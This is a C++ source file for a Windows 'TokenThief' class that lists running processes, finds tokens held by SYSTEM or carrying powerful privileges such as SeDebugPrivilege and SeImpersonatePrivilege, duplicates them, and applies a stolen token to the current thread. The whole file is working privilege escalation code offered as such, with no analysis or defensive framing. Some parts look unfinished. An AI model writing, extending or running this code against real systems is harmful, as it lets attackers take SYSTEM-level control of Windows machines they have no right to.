#pragma comment(lib, "advapi32.lib")
#include "Escalation.hpp"

TokenThief* tokenThief = new TokenThief;

TokenThief::TokenThief() {
    ParseProcesses();
}

bool TokenThief::IsSystemSid(PSID sid) {
    PSID systemSid = nullptr;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&ntAuthority, 1, SECURITY_LOCAL_SYSTEM_RID,
        0, 0, 0, 0, 0, 0, 0, &systemSid)) {
        return false;
    }
    BOOL isEqual = EqualSid(sid, systemSid);
    FreeSid(systemSid);
    return isEqual == TRUE;
}

std::vector<std::wstring> TokenThief::GetTokenPrivileges(HANDLE hToken) {
    std::vector<std::wstring> privileges;

    DWORD tokenInfoLength = 0;
    GetTokenInformation(hToken, TokenPrivileges, nullptr, 0, &tokenInfoLength);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        return privileges;
    }

    std::vector<BYTE> buffer(tokenInfoLength);
    if (!GetTokenInformation(hToken, TokenPrivileges, buffer.data(), tokenInfoLength, &tokenInfoLength)) {
        return privileges;
    }

    TOKEN_PRIVILEGES* tokenPrivileges = reinterpret_cast<TOKEN_PRIVILEGES*>(buffer.data());
    for (DWORD i = 0; i < tokenPrivileges->PrivilegeCount; ++i) {
        LUID_AND_ATTRIBUTES& laa = tokenPrivileges->Privileges[i];
        if (laa.Attributes & SE_PRIVILEGE_ENABLED) {
            WCHAR privilegeName[256];
            DWORD nameSize = sizeof(privilegeName) / sizeof(WCHAR);
            if (LookupPrivilegeNameW(nullptr, &laa.Luid, privilegeName, &nameSize)) {
                privileges.push_back(privilegeName);
            }
        }
    }

    return privileges;
}

int TokenThief::Escalate(HANDLE& token, int mode) {
    switch (mode) {
    case 1:
         break;
    case 2:
        DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenPrimaryHandle);
        DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &duplicateTokenImpersonationHandle);
        
        break;

    }
    return 0;
}

int TokenThief::ParseProcesses() {


    std::vector<std::wstring> criticalPrivileges = {
        L"SeAssignPrimaryTokenPrivilege",
        L"SeBackupPrivilege",
        L"SeDebugPrivilege",
        L"SeImpersonatePrivilege",
        L"SeLoadDriverPrivilege",
        L"SeRestorePrivilege",
        L"SeSecurityPrivilege",
        L"SeSystemEnvironmentPrivilege",
        L"SeTakeOwnershipPrivilege",
        L"SeTcbPrivilege"
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateToolhelp32Snapshot failed: " << GetLastError() << std::endl;
        return 1;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        std::cerr << "Process32First failed: " << GetLastError() << std::endl;
        CloseHandle(hSnapshot);
        return 1;
    }

    do {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
        if (!hProcess) continue;

        HANDLE hToken;
        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
            CloseHandle(hProcess);
            continue;
        }

        // Check for SYSTEM account
        DWORD tokenUserSize = 0;
        GetTokenInformation(hToken, TokenUser, nullptr, 0, &tokenUserSize);
        std::vector<BYTE> userBuffer(tokenUserSize);
        TOKEN_USER* tokenUser = nullptr;

        if (GetTokenInformation(hToken, TokenUser, userBuffer.data(), tokenUserSize, &tokenUserSize)) {
            tokenUser = reinterpret_cast<TOKEN_USER*>(userBuffer.data());
        }

        bool isSystem = tokenUser ? IsSystemSid(tokenUser->User.Sid) : false;

        // Check privileges
        std::vector<std::wstring> privileges = GetTokenPrivileges(hToken);
        std::vector<std::wstring> dangerousPrivs;
        HANDLE duplicateTokenHandle = NULL;
        for (const auto& priv : privileges) {
            for (const auto& crit : criticalPrivileges) {
                if (priv == crit) {
                    dangerousPrivs.push_back(priv);

                    Escalate(hToken, 2);
                    break;
                }
            }
        }

        // Output results if any interesting privileges found
        if (isSystem || !dangerousPrivs.empty()) {
            std::wcout << L"Process: " << pe32.szExeFile << L" (PID: " << pe32.th32ProcessID << L")" << std::endl;
            if (isSystem) {
                std::wcout << L"  * Running as SYSTEM account" << std::endl;
            }
            if (!dangerousPrivs.empty()) {
                std::wcout << L"  * Enabled dangerous privileges:" << std::endl;
                for (const auto& priv : dangerousPrivs) {
                    std::wcout << L"    - " << priv << std::endl;
                }
            }
            std::wcout << std::endl;
        }

        CloseHandle(hToken);
        CloseHandle(hProcess);

    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

void TokenThief::EnablePrivileges() {
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
        return;
    }

    // Privileges to enable
    LPCWSTR privileges[] = {
        SE_ASSIGNPRIMARYTOKEN_NAME,
        SE_INCREASE_QUOTA_NAME
    };

    for (auto priv : privileges) {
        LUID luid;
        if (!LookupPrivilegeValueW(NULL, priv, &luid)) {
            std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
            continue;
        }

        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
            std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
        }
    }

    CloseHandle(hToken);
}

void TokenThief::TokenSession() {
    sessionId = WTSGetActiveConsoleSessionId();
    if (!SetTokenInformation(tokenThief->duplicateTokenPrimaryHandle, TokenSessionId, &sessionId, sizeof(DWORD))) {
        std::cerr << "\n[-] SetTokenInformation failed: " << GetLastError() ;
    }

    int re = SetThreadToken(NULL, tokenThief->duplicateTokenImpersonationHandle);
    if (!re) { std::cerr << "\n[-] SetThreadToken failed. " << GetLastError(); }
    else { std::cout << "\n[+] SetThreadToken success. "; }
    return;


}